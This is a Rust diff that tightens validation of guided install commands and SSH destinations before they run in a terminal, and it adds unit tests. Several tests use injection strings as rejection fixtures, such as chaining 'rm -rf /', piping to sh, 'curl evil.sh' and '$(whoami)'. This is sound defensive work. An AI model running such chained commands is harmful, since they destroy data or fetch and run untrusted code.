@@ -28,6 +28,54 @@ pub fn open_in_terminal(path: &Path) -> Result<PathBuf, AppError> {
     Ok(cwd)
 }
 
+/// Package managers allowed as the first token of a guided install command.
+/// Install commands are Host-registered template strings, never free-form UI
+/// input; this allow-list is defense in depth against unexpected callers.
+const INSTALL_COMMAND_BINS: &[&str] = &[
+    "npm", "npx", "pnpm", "yarn", "brew", "cargo", "pip", "pip3", "pipx", "uv",
+];
+
+/// Validate a guided install command: known package-manager first token and
+/// no shell metacharacters that allow chaining or substitution. Plain `$VAR`
+/// expansion (e.g. `--prefix "$HOME/.local"`) stays allowed; `$(…)`, backticks,
+/// `;`, `&&`, `|`, redirects and brace expansion are rejected.
+fn validate_install_command(command: &str) -> Result<(), AppError> {
+    let first = command.split_whitespace().next().unwrap_or_default();
+    if !INSTALL_COMMAND_BINS.contains(&first) {
+        return Err(AppError::message(format!(
+            "install command must start with a known package manager ({})",
+            INSTALL_COMMAND_BINS.join(", ")
+        )));
+    }
+    let disallowed = |c: char| {
+        matches!(
+            c,
+            ';' | '&' | '|' | '<' | '>' | '(' | ')' | '`' | '{' | '}' | '\\' | '\n' | '\r'
+        )
+    };
+    if command.chars().any(disallowed) {
+        return Err(AppError::message(
+            "install command contains disallowed characters",
+        ));
+    }
+    Ok(())
+}
+
+/// Validate an SSH destination (`host` / `user@host`): conservative charset,
+/// no whitespace or shell metacharacters.
+fn validate_ssh_destination(destination: &str) -> Result<(), AppError> {
+    let ok = !destination.is_empty()
+        && destination
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '@' | '.' | '-' | '_' | ':'));
+    if !ok {
+        return Err(AppError::message(
+            "SSH destination contains disallowed characters",
+        ));
+    }
+    Ok(())
+}
+
 /// Open a system terminal that prints `command`, waits for Enter (or Ctrl+C), then runs it.
 ///
 /// Used for guided installs (e.g. Claude ACP adapter). The shell never auto-runs without
@@ -37,12 +85,7 @@ pub fn open_terminal_confirm_command(command: &str) -> Result<(), AppError> {
     if command.is_empty() {
         return Err(AppError::message("install command is required"));
     }
-    // Reject multi-line / shell metacharacter abuse from unexpected callers.
-    if command.contains('\n') || command.contains('\r') || command.contains(';') {
-        return Err(AppError::message(
-            "install command contains disallowed characters",
-        ));
-    }
+    validate_install_command(command)?;
 
     #[cfg(windows)]
     {
@@ -71,23 +114,8 @@ pub fn open_terminal_confirm_remote_install(
     if install_command.is_empty() {
         return Err(AppError::message("install command is required"));
     }
-    if destination.contains('\n')
-        || destination.contains('\r')
-        || destination.contains(';')
-        || destination.contains(' ')
-    {
-        return Err(AppError::message(
-            "SSH destination contains disallowed characters",
-        ));
-    }
-    if install_command.contains('\n')
-        || install_command.contains('\r')
-        || install_command.contains(';')
-    {
-        return Err(AppError::message(
-            "install command contains disallowed characters",
-        ));
-    }
+    validate_ssh_destination(destination)?;
+    validate_install_command(install_command)?;
 
     #[cfg(windows)]
     {
@@ -507,5 +535,64 @@ mod tests {
         let got = terminal_cwd_for_path(&file).unwrap();
         assert_eq!(got, dir);
         let _ = fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn install_command_accepts_registered_templates() {
+        for cmd in [
+            "npm i -g @agentclientprotocol/claude-agent-acp --prefix \"$HOME/.local\"",
+            "npm i -g @agentclientprotocol/codex-acp",
+            "brew install opencode",
+            "pipx install some-tool",
+        ] {
+            assert!(
+                validate_install_command(cmd).is_ok(),
+                "should accept: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn install_command_rejects_unknown_binaries() {
+        for cmd in ["rm -rf /", "curl https://x.sh", "bash -c 'x'", ""] {
+            assert!(
+                validate_install_command(cmd).is_err(),
+                "should reject: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn install_command_rejects_shell_metacharacters() {
+        for cmd in [
+            "npm i -g x; rm -rf /",
+            "npm i -g x && curl evil.sh",
+            "npm i -g x | sh",
+            "npm i -g $(whoami)",
+            "npm i -g `whoami`",
+            "npm i -g x > /etc/passwd",
+            "npm i -g x\ncurl evil.sh",
+        ] {
+            assert!(
+                validate_install_command(cmd).is_err(),
+                "should reject: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn ssh_destination_charset() {
+        for dest in ["host", "user@host.example.com", "user@10.0.0.2", "h-1_2:22"] {
+            assert!(
+                validate_ssh_destination(dest).is_ok(),
+                "should accept: {dest}"
+            );
+        }
+        for dest in ["host; rm -rf /", "host x", "host$(x)", "host`x`", ""] {
+            assert!(
+                validate_ssh_destination(dest).is_err(),
+                "should reject: {dest}"
+            );
+        }
     }
 }
